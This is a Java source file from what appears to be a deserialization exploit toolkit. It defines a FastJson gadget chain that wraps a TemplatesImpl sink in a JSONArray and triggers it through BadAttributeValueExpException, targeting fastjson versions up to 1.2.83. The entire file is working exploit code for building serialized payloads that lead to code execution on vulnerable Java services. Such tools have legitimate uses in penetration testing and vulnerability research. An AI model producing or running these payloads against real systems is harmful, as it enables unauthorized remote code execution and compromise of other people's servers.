package com.ppp.chain.json;

import com.alibaba.fastjson.JSONArray;
import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.chain.WrapSerialization;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

/**
 * @author Whoopsunix
 */
@Dependencies({"com.alibaba:fastjson:<=1.2.83"})
@Authors({Authors.Y4tacker, Authors.oneueo})
@Sink({Sink.TemplatesImpl})
public class FastJson implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(FastJson.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        // wrap
        if (sinksHelper.getWrapSerialization() != null) {
            Object o = WrapSerialization.scheduler(sinkObject, sinksHelper);
            sinkObject = (o != null) ? o : sinkObject;
        }

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException badAttributeValueExpException = KickOff.badAttributeValueExpException(jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates, badAttributeValueExpException);
        return hashMap;
    }
}
